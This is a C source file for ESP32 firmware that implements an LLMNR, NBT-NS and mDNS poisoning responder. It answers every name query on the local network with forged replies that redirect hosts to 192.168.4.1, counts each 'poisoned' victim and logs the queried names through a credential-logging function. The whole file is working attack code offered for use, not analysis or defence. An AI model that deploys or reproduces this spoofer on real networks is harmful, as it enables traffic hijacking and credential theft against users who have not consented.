#include "responder.h"
#include "storage_manager.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

static const char *TAG = "RESPOND";

#define REDIRECT_IP "192.168.4.1"

static bool s_running = false;
static volatile uint32_t s_poisoned = 0;

static int s_llmnr_fd = -1;
static int s_nbtns_fd = -1;
static int s_mdns_fd  = -1;

static TaskHandle_t s_responder_task = NULL;

/* ── DNS name label parsing (shared by LLMNR + mDNS) ── */

static int parse_dns_name(const uint8_t *buf, int off, int max, char *out, int out_len)
{
    int oi = 0;
    while (off < max) {
        uint8_t len = buf[off++];
        if (len == 0) break;
        if ((len & 0xC0) == 0xC0) { off++; break; }
        if (off + len > max || oi + len + 1 > out_len) break;
        if (oi > 0) out[oi++] = '.';
        memcpy(out + oi, buf + off, len);
        oi += len;
        off += len;
    }
    out[oi] = '\0';
    return off;
}

/* ── Build DNS-style response (used by LLMNR + mDNS) ── */

static int build_dns_response(const uint8_t *query, int qlen, uint8_t *resp, int max_resp)
{
    if (qlen < 12 || max_resp < 512) return 0;

    memcpy(resp, query, 2);
    resp[2] = 0x84; resp[3] = 0x00;
    memcpy(resp + 4, query + 4, 2);
    resp[6] = 0x00; resp[7] = 0x01;
    resp[8] = 0x00; resp[9] = 0x00;

    int off = 12;
    int qoff = 12;
    while (qoff < qlen) {
        uint8_t l = query[qoff];
        if (l == 0) { off = qoff + 1; break; }
        if ((l & 0xC0) == 0xC0) { off = qoff + 2; break; }
        qoff += 1 + l;
    }

    int name_end = off;
    off = qlen;

    if (off + 16 > max_resp) return 0;
    resp[off++] = 0xC0;
    resp[off++] = 0x0C;
    resp[off++] = 0x00;
    resp[off++] = 0x01;
    resp[off++] = 0x00;
    resp[off++] = 0x01;
    resp[off++] = 0x00;
    resp[off++] = 0x00;
    resp[off++] = 0x00;
    resp[off++] = 0x1E;
    resp[off++] = 0x00;
    resp[off++] = 0x04;

    uint32_t ip = inet_addr(REDIRECT_IP);
    memcpy(resp + off, &ip, 4);
    off += 4;

    return off;
}

/* ── LLMNR (UDP 5355, multicast 224.0.0.252) ────────── */

static void handle_llmnr(const uint8_t *buf, int len, struct sockaddr_in *src)
{
    if (len < 12) return;
    uint16_t flags = (buf[2] << 8) | buf[3];
    if (flags & 0x8000) return;
    uint16_t qdcount = (buf[4] << 8) | buf[5];
    if (qdcount == 0) return;

    char name[256];
    parse_dns_name(buf, 12, len, name, sizeof(name));
    if (!name[0]) return;

    uint8_t resp[512];
    int rlen = build_dns_response(buf, len, resp, sizeof(resp));
    if (rlen <= 0) return;

    sendto(s_llmnr_fd, resp, rlen, 0, (struct sockaddr *)src, sizeof(*src));
    s_poisoned++;
    ESP_LOGI(TAG, "LLMNR poisoned: %s → %s", name, REDIRECT_IP);
    storage_log_credential("responder_llmnr", "", name, "");
}

/* ── NBT-NS (UDP 137) ─────────────────────────────── */

static void handle_nbtns(const uint8_t *buf, int len, struct sockaddr_in *src)
{
    if (len < 12) return;
    uint16_t opcode = (buf[2] >> 3) & 0x1F;
    if (opcode != 0) return;

    char nbname[34] = {0};
    for (int i = 0; i < 32 && 13 + i < len; i += 2) {
        nbname[i / 2] = ((buf[13 + i] - 0x41) << 4) | (buf[14 + i] - 0x41);
    }
    nbname[16] = '\0';

    uint8_t resp[512];
    memset(resp, 0, sizeof(resp));
    memcpy(resp, buf, 12);
    resp[2] = 0x84; resp[3] = 0x00;
    resp[6] = 0x00; resp[7] = 0x01;
    resp[8] = 0x00; resp[9] = 0x00;

    int off = 12;
    int name_len = buf[off];
    memcpy(resp + off, buf + off, name_len + 2);
    off += name_len + 2;

    resp[off++] = 0x00; resp[off++] = 0x20;
    resp[off++] = 0x00; resp[off++] = 0x01;
    resp[off++] = 0x00; resp[off++] = 0x04;
    resp[off++] = 0x93;
    resp[off++] = 0x00;
    resp[off++] = 0x06;
    resp[off++] = 0x00;
    resp[off++] = 0x00;
    resp[off++] = 0x00;
    resp[off++] = 0x00;

    uint32_t ip = inet_addr(REDIRECT_IP);
    memcpy(resp + off, &ip, 4);
    off += 4;

    sendto(s_nbtns_fd, resp, off, 0, (struct sockaddr *)src, sizeof(*src));
    s_poisoned++;
    ESP_LOGI(TAG, "NBT-NS poisoned: %s → %s", nbname, REDIRECT_IP);
    storage_log_credential("responder_nbtns", "", nbname, "");
}

/* ── mDNS (UDP 5353, multicast 224.0.0.251) ────────── */

static void handle_mdns(const uint8_t *buf, int len, struct sockaddr_in *src)
{
    if (len < 12) return;
    uint16_t flags = (buf[2] << 8) | buf[3];
    if (flags & 0x8000) return;
    uint16_t qdcount = (buf[4] << 8) | buf[5];
    if (qdcount == 0) return;

    char name[256];
    parse_dns_name(buf, 12, len, name, sizeof(name));
    if (!name[0]) return;

    if (strstr(name, "_tcp") || strstr(name, "_udp")) return;

    uint8_t resp[512];
    int rlen = build_dns_response(buf, len, resp, sizeof(resp));
    if (rlen <= 0) return;

    sendto(s_mdns_fd, resp, rlen, 0, (struct sockaddr *)src, sizeof(*src));
    s_poisoned++;
    ESP_LOGI(TAG, "mDNS poisoned: %s → %s", name, REDIRECT_IP);
    storage_log_credential("responder_mdns", "", name, "");
}

/* ── Responder task ───────────────────────────────── */

static void responder_task(void *arg)
{
    responder_proto_t proto = (responder_proto_t)(intptr_t)arg;
    int max_fd = 0;
    fd_set readfds;

    while (s_running) {
        FD_ZERO(&readfds);
        max_fd = 0;

        if (proto & RESPONDER_LLMNR && s_llmnr_fd >= 0) {
            FD_SET(s_llmnr_fd, &readfds);
            if (s_llmnr_fd > max_fd) max_fd = s_llmnr_fd;
        }
        if (proto & RESPONDER_NBTNS && s_nbtns_fd >= 0) {
            FD_SET(s_nbtns_fd, &readfds);
            if (s_nbtns_fd > max_fd) max_fd = s_nbtns_fd;
        }
        if (proto & RESPONDER_MDNS && s_mdns_fd >= 0) {
            FD_SET(s_mdns_fd, &readfds);
            if (s_mdns_fd > max_fd) max_fd = s_mdns_fd;
        }

        struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };
        int ret = select(max_fd + 1, &readfds, NULL, NULL, &tv);
        if (ret <= 0) continue;

        uint8_t buf[1024];
        struct sockaddr_in src;
        socklen_t src_len = sizeof(src);

        if (FD_ISSET(s_llmnr_fd, &readfds)) {
            int len = recvfrom(s_llmnr_fd, buf, sizeof(buf), 0, (struct sockaddr *)&src, &src_len);
            if (len > 0 && ntohs(src.sin_port) != 5355) handle_llmnr(buf, len, &src);
        }
        if (FD_ISSET(s_nbtns_fd, &readfds)) {
            int len = recvfrom(s_nbtns_fd, buf, sizeof(buf), 0, (struct sockaddr *)&src, &src_len);
            if (len > 0) handle_nbtns(buf, len, &src);
        }
        if (FD_ISSET(s_mdns_fd, &readfds)) {
            int len = recvfrom(s_mdns_fd, buf, sizeof(buf), 0, (struct sockaddr *)&src, &src_len);
            if (len > 0 && ntohs(src.sin_port) != 5353) handle_mdns(buf, len, &src);
        }
    }

    s_responder_task = NULL;
    vTaskDelete(NULL);
}

/* ── Socket setup helpers ─────────────────────────── */

static int udp_listen(uint16_t port, uint32_t mcast_addr)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;

    int opt = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
        .sin_addr = { .s_addr = INADDR_ANY },
    };

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return -1;
    }

    if (mcast_addr) {
        struct ip_mreq mreq = { .imr_multiaddr = { .s_addr = mcast_addr }, .imr_interface = { .s_addr = INADDR_ANY } };
        setsockopt(fd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq));
    }

    return fd;
}

/* ── Public API ──────────────────────────────────── */

esp_err_t responder_start(responder_proto_t protocols)
{
    if (s_running) responder_stop();
    s_poisoned = 0;

    if (protocols & RESPONDER_LLMNR) {
        s_llmnr_fd = udp_listen(5355, inet_addr("224.0.0.252"));
        if (s_llmnr_fd >= 0) ESP_LOGI(TAG, "LLMNR listener on port 5355");
    }
    if (protocols & RESPONDER_NBTNS) {
        s_nbtns_fd = udp_listen(137, 0);
        if (s_nbtns_fd >= 0) ESP_LOGI(TAG, "NBT-NS listener on port 137");
    }
    if (protocols & RESPONDER_MDNS) {
        s_mdns_fd = udp_listen(5353, inet_addr("224.0.0.251"));
        if (s_mdns_fd >= 0) ESP_LOGI(TAG, "mDNS listener on port 5353");
    }

    if (s_llmnr_fd < 0 && s_nbtns_fd < 0 && s_mdns_fd < 0) {
        ESP_LOGE(TAG, "No listeners could be started");
        return ESP_FAIL;
    }

    s_running = true;
    xTaskCreatePinnedToCore(responder_task, "responder", 4096,
                            (void *)(intptr_t)protocols, 5, &s_responder_task, 0);

    ESP_LOGI(TAG, "Responder started (LLMNR=%d NBT-NS=%d mDNS=%d)",
             !!(protocols & RESPONDER_LLMNR),
             !!(protocols & RESPONDER_NBTNS),
             !!(protocols & RESPONDER_MDNS));
    return ESP_OK;
}

esp_err_t responder_stop(void)
{
    s_running = false;
    if (s_llmnr_fd >= 0) { close(s_llmnr_fd); s_llmnr_fd = -1; }
    if (s_nbtns_fd >= 0) { close(s_nbtns_fd); s_nbtns_fd = -1; }
    if (s_mdns_fd >= 0)  { close(s_mdns_fd);  s_mdns_fd = -1; }
    if (s_responder_task) { vTaskDelay(pdMS_TO_TICKS(200)); s_responder_task = NULL; }
    ESP_LOGI(TAG, "Responder stopped (%lu poisoned)", (unsigned long)s_poisoned);
    return ESP_OK;
}

bool responder_is_running(void) { return s_running; }
uint32_t responder_get_poisoned_count(void) { return s_poisoned; }
